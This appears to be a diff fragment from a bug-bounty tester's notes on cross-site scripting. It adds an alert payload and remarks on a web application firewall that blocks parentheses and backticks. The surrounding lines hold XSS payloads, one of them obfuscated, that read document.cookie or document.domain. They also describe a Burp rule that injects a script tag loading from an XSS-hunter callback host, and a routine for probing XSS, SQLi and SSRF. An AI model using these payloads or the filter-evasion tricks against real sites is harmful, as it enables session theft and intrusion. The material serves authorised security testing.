@@ -76,6 +76,10 @@ onerror=alert(document.cookie);>
 
 <svg/onload=a=self['aler'%2B't']%3Ba(document.domain)>
 
+a=alert,b=document.domain,a(b)
+
+The WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report.
+
 I set up a Burp match and replace rule that turns XXX into: '"><script src="xsshunter url"></script><h1>test
 Then I just put 'FooXXX' into everything I see, and see what happens. That'll find most trivial XSS and SQLi. Then I look at file uploads for SSRF and such.
 
